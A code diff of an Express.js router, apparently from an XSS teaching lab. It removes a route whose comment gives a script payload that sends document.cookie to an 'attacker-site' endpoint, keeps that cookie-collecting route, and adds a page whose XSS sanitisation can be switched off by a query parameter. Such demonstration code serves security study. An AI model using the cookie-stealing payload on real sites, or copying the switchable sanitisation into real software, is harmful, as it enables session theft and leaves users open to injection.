@@ -1,5 +1,6 @@
 var express = require("express");
 var bcrypt = require("bcrypt");
+var xss = require("xss");
 var router = express.Router();
 
 const db = require("../db/db");
@@ -31,17 +32,22 @@ router.post("/submit/sensitive", async function (req, res) {
   //console.log(await bcrypt.compare(password, protectedPassword));
 });
 
-router.get("/xss-attack", (req, res) => {
-  const userInput = req.query.input; // Retrieve user input from the query parameter
-  // %2b je +
-  //http://localhost:3000/xss-attack?input=<script>document.location='http://localhost:3000/attacker-site?cookie='%2bdocument.cookie</script>
-  res.render("xss-attack", { userInput });
+router.get("/send-mail", (req, res) => {
+  const checkbox = req.query.checkbox;
+  res.render("mail-register-confirm", {checkbox})
+});
+
+router.get("/after-registration", (req, res) => {
+  let {input, checkbox} = req.query;
+  if(checkbox=="false"){
+    input = xss(input);
+  }
+  res.render("after-registration", { input });
 });
 
 router.get("/attacker-site", (req, res) => {
   const cookie = req.query.cookie;
   res.render("attacker-site", { cookie });
 });
-
 
 module.exports = router;
